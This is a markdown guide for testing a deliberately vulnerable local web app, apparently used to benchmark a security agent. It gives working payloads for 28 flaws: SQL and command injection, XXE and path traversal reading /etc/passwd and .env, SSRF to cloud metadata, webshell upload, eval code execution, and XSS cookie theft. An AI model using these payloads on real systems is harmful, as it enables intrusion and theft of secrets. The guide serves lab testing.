# Vulnerability Testing Guide

Quick reference for testing all 28+ vulnerabilities in this application.

## Quick Test Commands

### 1. SQL Injection
```bash
curl "http://localhost:3000/api/users?username=admin' OR '1'='1"
```

### 2. NoSQL Injection
```bash
curl "http://localhost:3000/api/search?category=%7B%22%24ne%22%3Anull%7D"
# URL decoded: {"$ne":null}
```

### 3. Command Injection
Test via profile page or:
```javascript
searchFiles("; cat /etc/passwd")
```

### 4. XXE (XML External Entity)
```bash
curl -X POST http://localhost:3000/api/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>'
```

### 5. Server-Side Template Injection
```javascript
renderTemplate("${process.env.SECRET}", {})
```

### 6. Authentication Bypass (Multiple Methods)
```bash
# Method 1: Query parameter
curl "http://localhost:3000/api/admin?admin=true"

# Method 2: Cookie
curl "http://localhost:3000/api/admin" \
  -H "Cookie: isAdmin=true"

# Method 3: Bearer token
curl "http://localhost:3000/api/admin" \
  -H "Authorization: Bearer admin_super_secret_token"
```

### 7. JWT Vulnerabilities
```bash
# Generate weak JWT
curl -X POST http://localhost:3000/api/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"pass"}'

# Modify JWT payload and set role to admin, then:
curl http://localhost:3000/api/auth \
  -H "Authorization: Bearer <modified-jwt>"
```

### 8. Mass Assignment
```javascript
// In createUser form, add:
{
  "username": "hacker",
  "password": "pass",
  "isAdmin": true,
  "role": "admin",
  "accountBalance": 999999
}
```

### 9. IDOR (Insecure Direct Object Reference)
```javascript
// Access other users' documents
getDocument("2") // Get admin's private document
getDocument("3") // Get confidential document

// Delete other users
deleteUser("999") // Delete any user by ID
```

### 10. Path Traversal
```javascript
readFile("../../etc/passwd")
readFile("../../../.env")
```

Or:
```bash
curl "http://localhost:3000/api/upload?path=../../etc/passwd"
```

### 11. Unrestricted File Upload
```bash
curl -X POST http://localhost:3000/api/upload \
  -F "file=@malicious.php" \
  -F "filename=../../shell.php"
```

### 12. SSRF (Server-Side Request Forgery)
```javascript
fetchExternalData("http://localhost:3000/api/admin")
fetchExternalData("http://169.254.169.254/latest/meta-data/")
```

### 13. Open Redirect
```bash
curl "http://localhost:3000/api/redirect?url=http://evil.com"
curl "http://localhost:3000/api/redirect?returnTo=javascript:alert(1)"
```

### 14. XSS (Cross-Site Scripting)
In the profile page bio field:
```html
<img src=x onerror=alert('XSS')>
<script>alert(document.cookie)</script>
```

### 15. GraphQL Vulnerabilities
```bash
# Introspection
curl -X POST http://localhost:3000/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type } } } }"}'

# Get all user data including sensitive PII
curl -X POST http://localhost:3000/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id username password email ssn creditCard } }"}'
```

### 16. Insecure Deserialization
```bash
# RCE via deserialization
curl -X POST http://localhost:3000/api/deserialize \
  -H "Content-Type: application/json" \
  -d '{"serialized":"(function(){ return process.env })()"}'

# Session cookie deserialization
# Create base64 of: {"isAdmin": true}
# eyJpc0FkbWluIjogdHJ1ZX0=
curl http://localhost:3000/api/deserialize \
  -H "Cookie: session=eyJpc0FkbWluIjogdHJ1ZX0="
```

### 17. Race Condition
```bash
# Send multiple concurrent requests
for i in {1..10}; do
  curl -X POST http://localhost:3000/api/withdraw \
    -H "Content-Type: application/json" \
    -d '{"amount":100}' &
done
```

### 18. Timing Attack
```javascript
// Measure response times
async function timingAttack() {
  const tests = ['a', 's', 'su', 'sup'];
  for (const guess of tests) {
    const start = Date.now();
    await checkPassword(guess);
    const time = Date.now() - start;
    console.log(`"${guess}": ${time}ms`);
  }
}
```

### 19. Insecure Randomness
```javascript
// Generate multiple tokens and analyze pattern
for (let i = 0; i < 10; i++) {
  const result = await generateToken();
  console.log(result.token);
}
```

### 20. Information Disclosure
```bash
# Users endpoint exposes passwords
curl http://localhost:3000/api/users

# Admin endpoint exposes env vars
curl "http://localhost:3000/api/admin?admin=true"

# GraphQL exposes PII
curl -X POST http://localhost:3000/api/graphql \
  -d '{"query":"{ users { password ssn creditCard } }"}'
```

### 21. HTTP Parameter Pollution
```bash
curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{"id":"user","id":"admin","userId":"test"}'
```

### 22. Regex Injection (ReDoS)
```bash
# Catastrophic backtracking
curl "http://localhost:3000/api/search?q=(a%2B)%2B%24"
# URL decoded: (a+)+$
```

### 23. Privilege Escalation
```javascript
// Update profile with admin role
updateProfile({
  username: "hacker",
  bio: "normal user",
  role: "admin" // Escalate to admin
})
```

### 24. Exposed Secrets
```bash
# Check client-side env vars
curl http://localhost:3000 | grep "NEXT_PUBLIC"

# Get secrets from API
curl "http://localhost:3000/api/admin?admin=true" | jq .database
```

### 25. Verbose Error Messages
```bash
# Trigger errors to see stack traces
curl -X POST http://localhost:3000/api/graphql \
  -d '{"query":"invalid query"}'
```

### 26. Missing Rate Limiting
```bash
# Brute force with no throttling
for i in {1..1000}; do
  curl -X POST http://localhost:3000/api/users \
    -d '{"username":"admin","password":"pass'$i'"}' &
done
```

### 27. CORS Misconfiguration
```javascript
// From attacker.com
fetch('http://localhost:3000/api/admin?admin=true', {
  credentials: 'include'
}).then(r => r.json()).then(console.log)
```

### 28. Code Execution via eval()
```bash
# Multiple injection points use eval()
curl "http://localhost:3000/api/users?username=\\'%2Bconsole.log(process.env)%2B\\'"

curl -X GET http://localhost:3000/api/search?filter=item%20%3D%3E%20(console.log(process.env)%2C%20true)
```

## Testing with Security Agent

Run the automated security agent:
```bash
cd security_agent
./run.sh
```

The agent will automatically discover most of these vulnerabilities through:
1. Reconnaissance of endpoints
2. Hypothesis generation
3. Exploit script creation
4. Automated testing
5. Result analysis

## Manual Testing Checklist

- [ ] Test all authentication bypass methods
- [ ] Test all injection types (SQL, NoSQL, Command, XXE, Template)
- [ ] Test file operations (upload, path traversal)
- [ ] Test GraphQL introspection and data exposure
- [ ] Test SSRF with internal and external URLs
- [ ] Test deserialization with malicious payloads
- [ ] Test race conditions with concurrent requests
- [ ] Test timing attacks on password check
- [ ] Test IDOR on all resource endpoints
- [ ] Test mass assignment on user creation
- [ ] Test privilege escalation vectors
- [ ] Test open redirects
- [ ] Test XSS in all input fields
- [ ] Verify information disclosure in errors
- [ ] Test JWT manipulation
- [ ] Test ReDoS with complex regex patterns
- [ ] Test HTTP parameter pollution
- [ ] Verify lack of rate limiting

## Browser-Based Testing

Open the app in a browser and test:

1. **XSS**: Go to `/profile` and enter XSS payloads in bio
2. **CSRF**: Make cross-origin requests to endpoints
3. **Client-side secrets**: Check console for NEXT_PUBLIC vars
4. **GraphQL**: Use browser dev tools to send GraphQL queries

## Security Agent Expected Results

The agent should find:
- 20+ vulnerabilities in first 5 iterations
- All critical auth bypass methods
- Most injection vulnerabilities
- IDOR and privilege escalation paths
- Information disclosure issues

## Tips

- Use Burp Suite or OWASP ZAP for more thorough testing
- Monitor application logs while testing
- Test in Docker container for safety
- Document all findings for comparison with agent results
- Try combining vulnerabilities (e.g., XSS + CSRF, SSRF + XXE)

## Responsible Testing

- Only test in controlled environment
- Don't expose to internet
- Clean up after testing
- Use for educational purposes only
